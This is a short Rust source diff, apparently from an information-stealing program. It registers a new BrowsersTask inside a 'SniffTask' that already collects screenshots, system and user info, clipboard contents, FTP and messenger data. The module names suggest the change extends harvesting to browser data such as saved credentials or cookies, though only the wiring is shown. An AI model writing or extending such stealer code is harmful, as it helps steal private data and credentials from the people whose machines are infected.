@@ -14,6 +14,7 @@ use crate::screenshot::ScreenshotTask;
 use crate::systeminfo::SystemInfoTask;
 use crate::userinfo::UserInfoTask;
 use alloc::vec;
+use browsers::BrowsersTask;
 use ftp::FtpTask;
 use messengers::MessengersTask;
 use tasks::{composite_task, impl_composite_task_runner, CompositeTask, Task};
@@ -32,7 +33,8 @@ impl SniffTask {
                 ClipboardTask,
                 UserInfoTask,
                 FtpTask::new(),
-                MessengersTask::new()
+                MessengersTask::new(),
+                BrowsersTask::new(),
             )
         }
     }
